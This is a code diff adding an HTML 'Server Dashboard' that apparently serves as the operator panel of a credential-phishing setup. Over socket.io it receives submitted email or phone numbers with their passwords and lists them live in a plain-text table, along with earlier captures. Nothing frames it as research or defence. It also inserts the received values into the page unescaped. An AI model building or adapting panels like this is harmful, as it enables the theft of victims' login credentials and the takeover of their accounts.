@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Server Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  </head>
+  <body class="bg-gray-50">
+    <h1
+      class="text-white font-bold my-3 mx-auto mt-5 p-3 rounded-lg cursor-none bg-green-400 animate-pulse text-center w-1/2"
+    >
+      Server Dashboard
+    </h1>
+    <div
+      class="container shadow-sm bg-gray-100 mx-auto rounded-lg p-5 border-2 border-red-300 w-1/2"
+    >
+      <div class="border-2 list-none p-2 border-red-100 shadow-md">
+        <table class="table-auto w-full">
+          <thead>
+            <tr>
+              <th class="px-4 py-2">Email/Phone Number</th>
+              <th class="px-4 py-2">Password</th>
+            </tr>
+          </thead>
+          <tbody id="tableBody"></tbody>
+        </table>
+      </div>
+    </div>
+    <script src="https://cdn.socket.io/4.3.1/socket.io.min.js"></script>
+
+    <script>
+      const socket = io("http://localhost:3000");
+
+      // Function to append a new row to the table
+      function appendRow(email, password) {
+        const tableBody = document.getElementById("tableBody");
+        const newRow = document.createElement("tr");
+        newRow.innerHTML = `
+          <td class="border px-4 py-2">${email}</td>
+          <td class="border px-4 py-2">${password}</td>
+        `;
+        tableBody.appendChild(newRow);
+      }
+
+      // Listen for formDataHistory event to populate the table with history data
+      socket.on("formDataHistory", (formDataHistory) => {
+        formDataHistory.forEach(({ email, password }) => {
+          appendRow(email, password);
+        });
+      });
+
+      // Listen for formData event to append new data to the table
+      socket.on("formData", ({ email, password }) => {
+        appendRow(email, password);
+      });
+    </script>
+  </body>
+</html>
